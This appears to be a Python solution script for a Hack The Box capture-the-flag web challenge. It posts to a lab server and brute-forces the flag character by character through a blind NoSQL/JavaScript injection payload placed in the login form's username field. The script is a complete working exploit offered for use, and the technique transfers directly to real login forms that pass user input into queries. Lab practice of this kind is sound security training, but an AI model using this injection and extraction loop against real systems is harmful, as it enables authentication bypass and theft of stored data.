import requests

# Setup
url = "http://94.237.57.57:56699/index.php"
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # can also use for all ascii charc
flag_prefix = "HTB{"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xl;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://94.237.57.57:56699",
    "Referer": "http://94.237.57.57:56699/index.php",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

def test_prefix(candidate):
    payload = f'username="+||+(this.username.match(\'^{candidate}\'))+||+""%3d%3d"&password=test'
    response = requests.post(url, headers=headers, data=payload)
    return "Logged in as" in response.text

# Main brute loop
while not flag_prefix.endswith("}"):
    for c in charset:
        test = flag_prefix + c
        print(f"[*] Trying: {test}")
        if test_prefix(test):
            flag_prefix += c
            print(f"[+] Found next char: {c} -> {flag_prefix}")
            break
    else:
        print("[-] No matching char found. Aborting.")
        break

print(f"[✓] Final flag (partial or full): {flag_prefix}")
